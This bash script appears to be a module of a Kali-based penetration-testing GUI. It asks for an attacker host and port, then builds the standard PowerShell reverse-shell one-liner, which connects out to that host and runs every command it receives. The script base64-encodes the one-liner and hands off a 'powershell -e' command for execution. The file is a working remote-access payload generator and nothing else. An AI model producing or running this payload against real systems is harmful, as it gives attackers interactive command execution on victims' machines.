#!/bin/bash

: '
generate base64 reverse powershell
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LHOST_FIELD=$(form_item  "LHOST"  "lhost" "${KALI_IP}")
PORT_FIELD=$(form_item  "port" "number" "port" "1337")

# Generate GUI form
generate_form "${LHOST_FIELD}" "${PORT_FIELD}"

LHOST=${form_data["lhost"]}
PORT=${form_data["port"]}

REV_SHELL=$(echo "\$client = New-Object System.Net.Sockets.TCPClient(\"${LHOST}\",${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | iconv -t UTF-16LE | base64 -w 0)
execute_command "powershell -e ${REV_SHELL}"
